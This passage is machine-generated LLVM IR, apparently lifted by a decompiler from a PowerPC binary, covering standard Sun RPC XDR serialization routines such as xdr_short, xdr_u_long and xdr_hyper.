  store i32 %v2_10023e74, i32* @r4, align 4
  store i32 %v3_10023e64, i32* @r5, align 4
  store i32 268582532, i32* @lr, align 4
  %v0_10023e80 = call i32 @memcpy()
  store i32 %v0_10023e80, i32* %r3.global-to-local, align 4
  %v0_10023e84 = load i32, i32* %r30.global-to-local, align 4
  %v1_10023e84 = add i32 %v0_10023e84, 4
  %v2_10023e84 = inttoptr i32 %v1_10023e84 to i32*
  %v3_10023e84 = load i32, i32* %v2_10023e84, align 4
  store i32 %v3_10023e84, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10023e8c = load i32, i32* %r31.global-to-local, align 4
  %v1_10023e8c = add i32 %v0_10023e8c, 3
  store i32 %v1_10023e8c, i32* %r11.global-to-local, align 4
  %v1_10023e90 = call i32 @__asm_rlwinm(i32 %v1_10023e8c, i32 0, i32 0, i32 29)
  %v4_10023e94 = add i32 %v0_10023e8c, %v3_10023e84
  %v5_10023e94 = inttoptr i32 %v4_10023e94 to i8*
  store i8 0, i8* %v5_10023e94, align 1
  %v0_10023e98 = load i32, i32* %r29.global-to-local, align 4
  %v2_10023e98 = add i32 %v0_10023e98, %v1_10023e90
  store i32 %v2_10023e98, i32* %r9.global-to-local, align 4
  %v1_10023e9c = add i32 %v2_10023e98, 4
  store i32 %v1_10023e9c, i32* %r11.global-to-local, align 4
  %v1_10023ea0 = add i32 %v2_10023e98, 8
  store i32 %v1_10023ea0, i32* %r10.global-to-local, align 4
  %v3_10023ea4 = inttoptr i32 %v2_10023e98 to i32*
  %v4_10023ea4 = load i32, i32* %v3_10023ea4, align 4
  store i32 %v4_10023ea4, i32* %r0.global-to-local, align 4
  %v1_10023ea8 = load i32, i32* %r30.global-to-local, align 4
  %v2_10023ea8 = add i32 %v1_10023ea8, 8
  %v3_10023ea8 = inttoptr i32 %v2_10023ea8 to i32*
  store i32 %v4_10023ea4, i32* %v3_10023ea8, align 4
  %v0_10023eac = load i32, i32* %r9.global-to-local, align 4
  %v1_10023eac = add i32 %v0_10023eac, 4
  %v2_10023eac = inttoptr i32 %v1_10023eac to i32*
  %v3_10023eac = load i32, i32* %v2_10023eac, align 4
  store i32 %v3_10023eac, i32* %r0.global-to-local, align 4
  %v1_10023eb0 = load i32, i32* %r30.global-to-local, align 4
  %v2_10023eb0 = add i32 %v1_10023eb0, 12
  %v3_10023eb0 = inttoptr i32 %v2_10023eb0 to i32*
  store i32 %v3_10023eac, i32* %v3_10023eb0, align 4
  %v0_10023eb4 = load i32, i32* %r11.global-to-local, align 4
  %v1_10023eb4 = add i32 %v0_10023eb4, 4
  %v2_10023eb4 = inttoptr i32 %v1_10023eb4 to i32*
  %v3_10023eb4 = load i32, i32* %v2_10023eb4, align 4
  %v2_10023eb8 = icmp ugt i32 %v3_10023eb4, 16
  br i1 %v2_10023eb8, label %dec_label_pc_10023f9c, label %dec_label_pc_10023ec0

dec_label_pc_10023ec0:                            ; preds = %dec_label_pc_10023e70
  %v3_10023ec0 = icmp eq i32 %v3_10023eb4, 0
  %v1_10023ec4 = add i32 %v3_10023eb4, 1
  store i32 %v1_10023ec4, i32* %r0.global-to-local, align 4
  %v0_10023ec8 = load i32, i32* %r10.global-to-local, align 4
  %v1_10023ec8 = add i32 %v0_10023ec8, 4
  store i32 %v1_10023ec8, i32* %r11.global-to-local, align 4
  %v1_10023ecc = load i32, i32* %r30.global-to-local, align 4
  %v2_10023ecc = add i32 %v1_10023ecc, 16
  %v3_10023ecc = inttoptr i32 %v2_10023ecc to i32*
  store i32 %v3_10023eb4, i32* %v3_10023ecc, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v0_10023ed4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_10023ed4, i32* %ctr.global-to-local, align 4
  br i1 %v3_10023ec0, label %dec_label_pc_10023ef8.preheader.thread, label %dec_label_pc_10023ef8.preheader

dec_label_pc_10023ef8.preheader.thread:           ; preds = %dec_label_pc_10023ec0
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r10.global-to-local, align 4
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_10023f04

dec_label_pc_10023ef8.preheader:                  ; preds = %dec_label_pc_10023ec0
  store i32 1, i32* %r10.global-to-local, align 4
  %v1_10023f005 = add i32 %v0_10023ed4, -1
  store i32 %v1_10023f005, i32* %ctr.global-to-local, align 4
  %v2_10023f006 = icmp eq i32 %v1_10023f005, 0
  br i1 %v2_10023f006, label %dec_label_pc_10023f04, label %dec_label_pc_10023ee8

dec_label_pc_10023ee8:                            ; preds = %dec_label_pc_10023ef8.preheader, %dec_label_pc_10023ee8
  %v1_10023ef4 = phi i32 [ %v1_10023ef8, %dec_label_pc_10023ee8 ], [ 0, %dec_label_pc_10023ef8.preheader ]
  %v0_10023ee8 = load i32, i32* %r11.global-to-local, align 4
  %v1_10023ee8 = inttoptr i32 %v0_10023ee8 to i32*
  %v2_10023ee8 = load i32, i32* %v1_10023ee8, align 4
  store i32 %v2_10023ee8, i32* %r0.global-to-local, align 4
  %v1_10023eec = add i32 %v0_10023ee8, 4
  store i32 %v1_10023eec, i32* %r11.global-to-local, align 4
  %v0_10023ef0 = load i32, i32* %r30.global-to-local, align 4
  %v1_10023ef0 = add i32 %v0_10023ef0, 20
  %v2_10023ef0 = inttoptr i32 %v1_10023ef0 to i32*
  %v3_10023ef0 = load i32, i32* %v2_10023ef0, align 4
  store i32 %v3_10023ef0, i32* %r9.global-to-local, align 4
  %v3_10023ef4 = add i32 %v3_10023ef0, %v1_10023ef4
  %v4_10023ef4 = inttoptr i32 %v3_10023ef4 to i32*
  store i32 %v2_10023ee8, i32* %v4_10023ef4, align 4
  %v0_10023ef8 = load i32, i32* %r10.global-to-local, align 4
  %v1_10023ef8 = mul i32 %v0_10023ef8, 4
  %v1_10023efc = add i32 %v0_10023ef8, 1
  store i32 %v1_10023efc, i32* %r10.global-to-local, align 4
  %v0_10023f00 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10023f00 = add i32 %v0_10023f00, -1
  store i32 %v1_10023f00, i32* %ctr.global-to-local, align 4
  %v2_10023f00 = icmp eq i32 %v1_10023f00, 0
  br i1 %v2_10023f00, label %dec_label_pc_10023f04, label %dec_label_pc_10023ee8

dec_label_pc_10023f04:                            ; preds = %dec_label_pc_10023ee8, %dec_label_pc_10023ef8.preheader.thread, %dec_label_pc_10023ef8.preheader
  %v1_10023f04 = mul i32 %v3_10023eb4, 4
  %v1_10023f08 = add i32 %v1_10023e90, 20
  store i32 %v1_10023f08, i32* %r9.global-to-local, align 4
  %v2_10023f0c = add i32 %v1_10023f04, %v1_10023f08
  store i32 %v2_10023f0c, i32* %r0.global-to-local, align 4
  %v1_10023f10 = load i32, i32* %r28.global-to-local, align 4
  %v3_10023f10 = icmp ugt i32 %v2_10023f0c, %v1_10023f10
  br i1 %v3_10023f10, label %dec_label_pc_10023f18, label %dec_label_pc_10023f5c

dec_label_pc_10023f18:                            ; preds = %dec_label_pc_10023f04
  store i32 ptrtoint ([36 x i8]* @global_var_1002fa80.1320 to i32), i32* %r3.global-to-local, align 4
  %v6_10023f28 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @global_var_1002fa80.1320, i32 0, i32 0), i32 %v3_10023eb4, i32 %v1_10023e90, i32 %v1_10023f10)
  store i32 %v6_10023f28, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10023f9c

dec_label_pc_10023f30:                            ; preds = %entry
  store i32 %v2_10023e08, i32* %r3.global-to-local, align 4
  %v0_10023f34 = load i32, i32* %r30.global-to-local, align 4
  store i32 268582716, i32* @lr, align 4
  %v3_10023f38 = call i32 @__GI_xdr_authunix_parms(i32* nonnull %stack_var_-56, i32 %v0_10023f34)
  store i32 %v3_10023f38, i32* %r3.global-to-local, align 4
  %v3_10023f3c = icmp eq i32 %v3_10023f38, 0
  br i1 %v3_10023f3c, label %dec_label_pc_10023f44, label %dec_label_pc_10023f5c

dec_label_pc_10023f44:                            ; preds = %dec_label_pc_10023f30
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 %v2_10023e08, i32* %r3.global-to-local, align 4
  %v0_10023f4c = load i32, i32* @r30, align 4
  store i32 2, i32* %stack_var_-56, align 4
  store i32 ptrtoint (i32* @global_var_10023f58.1322 to i32), i32* @lr, align 4
  %v3_10023f54 = call i32 @__GI_xdr_authunix_parms(i32* nonnull %stack_var_-56, i32 %v0_10023f4c)
  store i32 %v3_10023f54, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10023f9c

dec_label_pc_10023f5c:                            ; preds = %dec_label_pc_10023f30, %dec_label_pc_10023f04
  %v0_10023f5c = load i32, i32* @r27, align 4
  %v1_10023f5c = add i32 %v0_10023f5c, 44
  %v2_10023f5c = inttoptr i32 %v1_10023f5c to i32*
  %v3_10023f5c = load i32, i32* %v2_10023f5c, align 4
  store i32 %v3_10023f5c, i32* %r10.global-to-local, align 4
  %v0_10023f60 = load i32, i32* @r26, align 4
  %v1_10023f60 = add i32 %v0_10023f60, 28
  %v2_10023f60 = inttoptr i32 %v1_10023f60 to i32*
  %v3_10023f60 = load i32, i32* %v2_10023f60, align 4
  store i32 %v3_10023f60, i32* %r9.global-to-local, align 4
  %v3_10023f64 = icmp eq i32 %v3_10023f5c, 0
  br i1 %v3_10023f64, label %dec_label_pc_10023f88, label %dec_label_pc_10023f6c

dec_label_pc_10023f6c:                            ; preds = %dec_label_pc_10023f5c
  %v1_10023f6c = add i32 %v0_10023f5c, 36
  %v2_10023f6c = inttoptr i32 %v1_10023f6c to i32*
  %v3_10023f6c = load i32, i32* %v2_10023f6c, align 4
  store i32 %v3_10023f6c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  %v1_10023f74 = add i32 %v0_10023f5c, 40
  %v2_10023f74 = inttoptr i32 %v1_10023f74 to i32*
  %v3_10023f74 = load i32, i32* %v2_10023f74, align 4
  store i32 %v3_10023f74, i32* %r11.global-to-local, align 4
  %v2_10023f78 = add i32 %v3_10023f60, 32
  %v3_10023f78 = inttoptr i32 %v2_10023f78 to i32*
  store i32 %v3_10023f6c, i32* %v3_10023f78, align 4
  %v0_10023f7c = load i32, i32* @r26, align 4
  %v1_10023f7c = add i32 %v0_10023f7c, 28
  %v2_10023f7c = inttoptr i32 %v1_10023f7c to i32*
  %v3_10023f7c = load i32, i32* %v2_10023f7c, align 4
  store i32 %v3_10023f7c, i32* %r9.global-to-local, align 4
  %v0_10023f80 = load i32, i32* %r11.global-to-local, align 4
  %v2_10023f80 = add i32 %v3_10023f7c, 36
  %v3_10023f80 = inttoptr i32 %v2_10023f80 to i32*
  store i32 %v0_10023f80, i32* %v3_10023f80, align 4
  br label %dec_label_pc_10023f90

dec_label_pc_10023f88:                            ; preds = %dec_label_pc_10023f5c
  %v2_10023f88 = add i32 %v3_10023f60, 32
  %v3_10023f88 = inttoptr i32 %v2_10023f88 to i32*
  store i32 0, i32* %v3_10023f88, align 4
  store i32 0, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10023f90

dec_label_pc_10023f90:                            ; preds = %dec_label_pc_10023f6c, %dec_label_pc_10023f88
  %v0_10023f90 = load i32, i32* @r26, align 4
  %v1_10023f90 = add i32 %v0_10023f90, 28
  %v2_10023f90 = inttoptr i32 %v1_10023f90 to i32*
  %v3_10023f90 = load i32, i32* %v2_10023f90, align 4
  store i32 %v3_10023f90, i32* %r9.global-to-local, align 4
  %v0_10023f94 = load i32, i32* %r10.global-to-local, align 4
  %v2_10023f94 = add i32 %v3_10023f90, 40
  %v3_10023f94 = inttoptr i32 %v2_10023f94 to i32*
  store i32 %v0_10023f94, i32* %v3_10023f94, align 4
  br label %dec_label_pc_10023fa0

dec_label_pc_10023f9c:                            ; preds = %dec_label_pc_10023e70, %dec_label_pc_10023e58, %dec_label_pc_10023f44, %dec_label_pc_10023f18
  store i32 1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_10023fa0

dec_label_pc_10023fa0:                            ; preds = %dec_label_pc_10023f90, %dec_label_pc_10023f9c
  %v3_10023fa0 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_10023fa0, i32* %r9.global-to-local, align 4
  %v1_10023fa4 = add i32 %v3_10023fa0, 28
  %v2_10023fa4 = inttoptr i32 %v1_10023fa4 to i32*
  %v3_10023fa4 = load i32, i32* %v2_10023fa4, align 4
  store i32 %v3_10023fa4, i32* %r0.global-to-local, align 4
  %v3_10023fa8 = icmp eq i32 %v3_10023fa4, 0
  br i1 %v3_10023fa8, label %dec_label_pc_10023fbc, label %dec_label_pc_10023fb0

dec_label_pc_10023fb0:                            ; preds = %dec_label_pc_10023fa0
  store i32 %v2_10023e08, i32* %r3.global-to-local, align 4
  store i32 %v3_10023fa4, i32* %ctr.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_10023fa4)
  br label %dec_label_pc_10023fbc

dec_label_pc_10023fbc:                            ; preds = %dec_label_pc_10023fa0, %dec_label_pc_10023fb0
  store i32 %v0_10023df4, i32* %r0.global-to-local, align 4
  %v0_10023fc0 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10023fc0, i32* %r3.global-to-local, align 4
  ret i32 %v0_10023fc0

; uselistorder directives
  uselistorder i32 %v3_10023fa4, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10023f5c, { 1, 0, 2 }
  uselistorder i32 %v1_10023f00, { 1, 0 }
  uselistorder i32 %v0_10023ef8, { 1, 0 }
  uselistorder i32 %v3_10023eb4, { 1, 0, 3, 2, 4, 5 }
  uselistorder i32 %v1_10023e90, { 1, 2, 0 }
  uselistorder i32* %stack_var_-56, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32* %stack_var_-52, { 0, 1, 3, 2 }
  uselistorder i32* %r31.global-to-local, { 2, 0, 1, 3, 4, 5, 6 }
  uselistorder i32* %r30.global-to-local, { 0, 1, 2, 3, 4, 6, 7, 5, 8, 9 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0 }
  uselistorder i32* %r10.global-to-local, { 1, 2, 3, 7, 8, 0, 4, 5, 6 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14 }
  uselistorder i32* %ctr.global-to-local, { 1, 2, 5, 6, 0, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10023fbc, { 1, 0 }
  uselistorder label %dec_label_pc_10023fa0, { 1, 0 }
  uselistorder label %dec_label_pc_10023f9c, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_10023f90, { 1, 0 }
  uselistorder label %dec_label_pc_10023f04, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10023ee8, { 1, 0 }
}

define i32 @xdr_free(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  store i32 2, i32* %stack_var_-40, align 4
  %v2_10023fec = ptrtoint i32* %stack_var_-40 to i32
  call void @__pseudo_call(i32 %arg1)
  ret i32 %v2_10023fec

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
}

define i32 @xdr_void() local_unnamed_addr {
entry:
  ret i32 1
}

define i32 @__GI_xdr_long() local_unnamed_addr {
entry:
  %v0_1002401c = load i32, i32* @r3, align 4
  %v1_1002401c = inttoptr i32 %v0_1002401c to i32*
  %v2_1002401c = load i32, i32* %v1_1002401c, align 4
  %v3_10024020 = icmp eq i32 %v2_1002401c, 0
  br i1 %v3_10024020, label %dec_label_pc_1002402c, label %dec_label_pc_10024038

dec_label_pc_1002402c:                            ; preds = %entry
  %v1_1002402c = add i32 %v0_1002401c, 4
  %v2_1002402c = inttoptr i32 %v1_1002402c to i32*
  %v3_1002402c = load i32, i32* %v2_1002402c, align 4
  %v1_10024030 = add i32 %v3_1002402c, 4
  br label %dec_label_pc_1002404c

dec_label_pc_10024038:                            ; preds = %entry
  %v3_10024024 = icmp eq i32 %v2_1002401c, 1
  br i1 %v3_10024024, label %dec_label_pc_10024044, label %dec_label_pc_10024060

dec_label_pc_10024044:                            ; preds = %dec_label_pc_10024038
  %v1_10024044 = add i32 %v0_1002401c, 4
  %v2_10024044 = inttoptr i32 %v1_10024044 to i32*
  %v3_10024044 = load i32, i32* %v2_10024044, align 4
  br label %dec_label_pc_1002404c

dec_label_pc_1002404c:                            ; preds = %dec_label_pc_1002402c, %dec_label_pc_10024044
  %storemerge.in.in = phi i32 [ %v1_10024030, %dec_label_pc_1002402c ], [ %v3_10024044, %dec_label_pc_10024044 ]
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  call void @__pseudo_call(i32 %storemerge)
  %v0_10024054 = load i32, i32* @r3, align 4
  br label %dec_label_pc_10024060

dec_label_pc_10024060:                            ; preds = %dec_label_pc_10024038, %dec_label_pc_1002404c
  %storemerge1 = phi i32 [ %v0_10024054, %dec_label_pc_1002404c ], [ 0, %dec_label_pc_10024038 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v0_1002401c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10024060, { 1, 0 }
  uselistorder label %dec_label_pc_1002404c, { 1, 0 }
}

define i32 @xdr_short(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %stack_var_-24 = alloca i16, align 2
  store i32 %arg2, i32* %r31.global-to-local, align 4
  %v0_1002408c = load i32, i32* %r3.global-to-local, align 4
  %v1_1002408c = inttoptr i32 %v0_1002408c to i32*
  %v2_1002408c = load i32, i32* %v1_1002408c, align 4
  %v3_10024090 = icmp eq i32 %v2_1002408c, 1
  br i1 %v3_10024090, label %dec_label_pc_100240cc, label %dec_label_pc_1002409c

dec_label_pc_1002409c:                            ; preds = %entry
  %v1_10024094 = icmp eq i32 %v2_1002408c, 0
  br i1 %v1_10024094, label %dec_label_pc_100240b0, label %dec_label_pc_100240a4

dec_label_pc_100240a4:                            ; preds = %dec_label_pc_1002409c
  %v3_1002409c = icmp eq i32 %v2_1002408c, 2
  store i32 1, i32* %r3.global-to-local, align 4
  br i1 %v3_1002409c, label %dec_label_pc_100240f8, label %dec_label_pc_100240f4

dec_label_pc_100240b0:                            ; preds = %dec_label_pc_1002409c
  %v1_100240b0 = inttoptr i32 %arg2 to i16*
  %v2_100240b0 = load i16, i16* %v1_100240b0, align 2
  %v1_100240b4 = add i32 %v0_1002408c, 4
  %v2_100240b4 = inttoptr i32 %v1_100240b4 to i32*
  %v3_100240b4 = load i32, i32* %v2_100240b4, align 4
  store i16 %v2_100240b0, i16* %stack_var_-24, align 2
  %v1_100240bc = add i32 %v3_100240b4, 4
  %v2_100240bc = inttoptr i32 %v1_100240bc to i32*
  %v3_100240bc = load i32, i32* %v2_100240bc, align 4
  call void @__pseudo_call(i32 %v3_100240bc)
  br label %dec_label_pc_100240f8

dec_label_pc_100240cc:                            ; preds = %entry
  %v1_100240cc = add i32 %v0_1002408c, 4
  %v2_100240cc = inttoptr i32 %v1_100240cc to i32*
  %v3_100240cc = load i32, i32* %v2_100240cc, align 4
  %v1_100240d0 = inttoptr i32 %v3_100240cc to i32*
  %v2_100240d0 = load i32, i32* %v1_100240d0, align 4
  call void @__pseudo_call(i32 %v2_100240d0)
  %v0_100240dc = load i32, i32* %r3.global-to-local, align 4
  %v3_100240dc = icmp eq i32 %v0_100240dc, 0
  store i32 1, i32* %r3.global-to-local, align 4
  br i1 %v3_100240dc, label %dec_label_pc_100240f4, label %dec_label_pc_100240e8

dec_label_pc_100240e8:                            ; preds = %dec_label_pc_100240cc
  %v3_100240e8 = load i16, i16* %stack_var_-24, align 2
  %v2_100240ec = load i32, i32* %r31.global-to-local, align 4
  %v3_100240ec = inttoptr i32 %v2_100240ec to i16*
  store i16 %v3_100240e8, i16* %v3_100240ec, align 2
  br label %dec_label_pc_100240f8

dec_label_pc_100240f4:                            ; preds = %dec_label_pc_100240a4, %dec_label_pc_100240cc
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100240f8

dec_label_pc_100240f8:                            ; preds = %dec_label_pc_100240a4, %dec_label_pc_100240e8, %dec_label_pc_100240b0, %dec_label_pc_100240f4
  %v0_10024108 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10024108

; uselistorder directives
  uselistorder i16* %stack_var_-24, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 5, 3, 4, 0, 6, 1, 2 }
  uselistorder label %dec_label_pc_100240f8, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_100240f4, { 1, 0 }
}

define i32 @__GI_xdr_int(i32 %arg1) local_unnamed_addr {
entry:
  %v0_1002410c = call i32 @__GI_xdr_long()
  ret i32 %v0_1002410c
}

define i32 @xdr_u_long() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1002411c = load i32, i32* @r4, align 4
  store i32 %v0_1002411c, i32* %r31.global-to-local, align 4
  %v0_10024124 = load i32, i32* @r3, align 4
  %v1_10024124 = inttoptr i32 %v0_10024124 to i32*
  %v2_10024124 = load i32, i32* %v1_10024124, align 4
  %v3_10024128 = icmp eq i32 %v2_10024124, 1
  br i1 %v3_10024128, label %dec_label_pc_10024148, label %dec_label_pc_10024134

dec_label_pc_10024134:                            ; preds = %entry
  %v1_1002412c = icmp eq i32 %v2_10024124, 0
  br i1 %v1_1002412c, label %dec_label_pc_10024174, label %dec_label_pc_1002413c

dec_label_pc_1002413c:                            ; preds = %dec_label_pc_10024134
  %v3_10024134 = icmp eq i32 %v2_10024124, 2
  store i32 1, i32* @r3, align 4
  br i1 %v3_10024134, label %dec_label_pc_1002418c, label %dec_label_pc_10024188

dec_label_pc_10024148:                            ; preds = %entry
  %v1_10024148 = add i32 %v0_10024124, 4
  %v2_10024148 = inttoptr i32 %v1_10024148 to i32*
  %v3_10024148 = load i32, i32* %v2_10024148, align 4
  %v1_10024150 = inttoptr i32 %v3_10024148 to i32*
  %v2_10024150 = load i32, i32* %v1_10024150, align 4
  call void @__pseudo_call(i32 %v2_10024150)
  %v0_1002415c = load i32, i32* @r3, align 4
  %v3_1002415c = icmp eq i32 %v0_1002415c, 0
  store i32 1, i32* @r3, align 4
  br i1 %v3_1002415c, label %dec_label_pc_10024188, label %dec_label_pc_10024168

dec_label_pc_10024168:                            ; preds = %dec_label_pc_10024148
  %v3_10024168 = load i32, i32* %stack_var_-24, align 4
  %v1_1002416c = load i32, i32* %r31.global-to-local, align 4
  %v2_1002416c = inttoptr i32 %v1_1002416c to i32*
  store i32 %v3_10024168, i32* %v2_1002416c, align 4
  br label %dec_label_pc_1002418c

dec_label_pc_10024174:                            ; preds = %dec_label_pc_10024134
  %v1_10024174 = add i32 %v0_10024124, 4
  %v2_10024174 = inttoptr i32 %v1_10024174 to i32*
  %v3_10024174 = load i32, i32* %v2_10024174, align 4
  %v1_10024178 = add i32 %v3_10024174, 4
  %v2_10024178 = inttoptr i32 %v1_10024178 to i32*
  %v3_10024178 = load i32, i32* %v2_10024178, align 4
  call void @__pseudo_call(i32 %v3_10024178)
  br label %dec_label_pc_1002418c

dec_label_pc_10024188:                            ; preds = %dec_label_pc_1002413c, %dec_label_pc_10024148
  store i32 0, i32* @r3, align 4
  br label %dec_label_pc_1002418c

dec_label_pc_1002418c:                            ; preds = %dec_label_pc_1002413c, %dec_label_pc_10024174, %dec_label_pc_10024168, %dec_label_pc_10024188
  %v0_1002419c = load i32, i32* @r3, align 4
  ret i32 %v0_1002419c

; uselistorder directives
  uselistorder i32 %v0_10024124, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1002418c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_10024188, { 1, 0 }
}

define i32 @xdr_u_int(i32* %xdrs, i32* %ulp) local_unnamed_addr {
entry:
  %v0_100241a0 = call i32 @xdr_u_long()
  ret i32 %v0_100241a0
}

define i32 @__GI_xdr_hyper() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_100241a8 = load i32, i32* @lr, align 4
  store i32 %v0_100241a8, i32* %r0.global-to-local, align 4
  %v0_100241b0 = load i32, i32* @r4, align 4
  store i32 %v0_100241b0, i32* %r30.global-to-local, align 4
  %v0_100241b8 = load i32, i32* @r3, align 4
  store i32 %v0_100241b8, i32* %r31.global-to-local, align 4
  %v1_100241c0 = inttoptr i32 %v0_100241b8 to i32*
  %v2_100241c0 = load i32, i32* %v1_100241c0, align 4
  store i32 %v2_100241c0, i32* %r0.global-to-local, align 4
  %v3_100241c4 = icmp eq i32 %v2_100241c0, 0
  br i1 %v3_100241c4, label %dec_label_pc_100241d0, label %dec_label_pc_10024230

dec_label_pc_100241d0:                            ; preds = %entry
  %v1_100241d0 = inttoptr i32 %v0_100241b0 to i32*
  %v2_100241d0 = load i32, i32* %v1_100241d0, align 4
  %v1_100241d4 = add i32 %v0_100241b0, 4
  %v2_100241d4 = inttoptr i32 %v1_100241d4 to i32*
  %v3_100241d8 = load i32, i32* %v2_100241d4, align 4
  store i32 %v3_100241d8, i32* %r0.global-to-local, align 4
  %v1_100241dc = add i32 %v0_100241b8, 4
  %v2_100241dc = inttoptr i32 %v1_100241dc to i32*
  %v3_100241dc = load i32, i32* %v2_100241dc, align 4
  store i32 %v2_100241d0, i32* %r8.global-to-local, align 4
  store i32 %v2_100241d0, i32* %stack_var_-24, align 4
  store i32 %v3_100241d8, i32* %stack_var_-20, align 4
  %v1_100241f0 = add i32 %v3_100241dc, 4
  %v2_100241f0 = inttoptr i32 %v1_100241f0 to i32*
  %v3_100241f0 = load i32, i32* %v2_100241f0, align 4
  call void @__pseudo_call(i32 %v3_100241f0)
  %v0_10024200 = load i32, i32* @r3, align 4
  %v3_10024200 = icmp eq i32 %v0_10024200, 0
  store i32 0, i32* %r8.global-to-local, align 4
  %v0_10024208 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10024208, i32* %r3.global-to-local, align 4
  br i1 %v3_10024200, label %dec_label_pc_10024298, label %dec_label_pc_10024210

dec_label_pc_10024210:                            ; preds = %dec_label_pc_100241d0
  %v1_10024210 = add i32 %v0_10024208, 4
  %v2_10024210 = inttoptr i32 %v1_10024210 to i32*
  %v3_10024210 = load i32, i32* %v2_10024210, align 4
  %v1_10024214 = add i32 %v3_10024210, 4
  %v2_10024214 = inttoptr i32 %v1_10024214 to i32*
  %v3_10024214 = load i32, i32* %v2_10024214, align 4
  call void @__pseudo_call(i32 %v3_10024214)
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10024298

dec_label_pc_10024230:                            ; preds = %entry
  %v3_100241c8 = icmp eq i32 %v2_100241c0, 1
  store i32 0, i32* %r8.global-to-local, align 4
  br i1 %v3_100241c8, label %dec_label_pc_10024244, label %dec_label_pc_10024298

dec_label_pc_10024244:                            ; preds = %dec_label_pc_10024230
  %v1_10024244 = add i32 %v0_100241b8, 4
  %v2_10024244 = inttoptr i32 %v1_10024244 to i32*
  %v3_10024244 = load i32, i32* %v2_10024244, align 4
  %v1_10024248 = inttoptr i32 %v3_10024244 to i32*
  %v2_10024248 = load i32, i32* %v1_10024248, align 4
  call void @__pseudo_call(i32 %v2_10024248)
  %v0_10024258 = load i32, i32* @r3, align 4
  %v3_10024258 = icmp eq i32 %v0_10024258, 0
  %v0_1002425c = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_1002425c, i32* %r3.global-to-local, align 4
  br i1 %v3_10024258, label %dec_label_pc_10024294, label %dec_label_pc_10024264

dec_label_pc_10024264:                            ; preds = %dec_label_pc_10024244
  %v1_10024264 = add i32 %v0_1002425c, 4
  %v2_10024264 = inttoptr i32 %v1_10024264 to i32*
  %v3_10024264 = load i32, i32* %v2_10024264, align 4
  %v1_10024268 = inttoptr i32 %v3_10024264 to i32*
  %v2_10024268 = load i32, i32* %v1_10024268, align 4
  call void @__pseudo_call(i32 %v2_10024268)
  store i32 1, i32* %r8.global-to-local, align 4
  %v0_10024278 = load i32, i32* %r3.global-to-local, align 4
  %v3_10024278 = icmp eq i32 %v0_10024278, 0
  br i1 %v3_10024278, label %dec_label_pc_10024294, label %dec_label_pc_10024280

dec_label_pc_10024280:                            ; preds = %dec_label_pc_10024264
  %v3_10024280 = load i32, i32* %stack_var_-20, align 4
  %v3_10024284 = load i32, i32* %stack_var_-24, align 4
  store i32 %v3_10024284, i32* %r0.global-to-local, align 4
  %v1_10024288 = load i32, i32* %r30.global-to-local, align 4
  %v2_10024288 = add i32 %v1_10024288, 4
  %v3_10024288 = inttoptr i32 %v2_10024288 to i32*
  store i32 %v3_10024280, i32* %v3_10024288, align 4
  %v0_1002428c = load i32, i32* %r0.global-to-local, align 4
  %v1_1002428c = load i32, i32* %r30.global-to-local, align 4
  %v2_1002428c = inttoptr i32 %v1_1002428c to i32*
  store i32 %v0_1002428c, i32* %v2_1002428c, align 4
  %v0_1002429c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10024298

dec_label_pc_10024294:                            ; preds = %dec_label_pc_10024264, %dec_label_pc_10024244
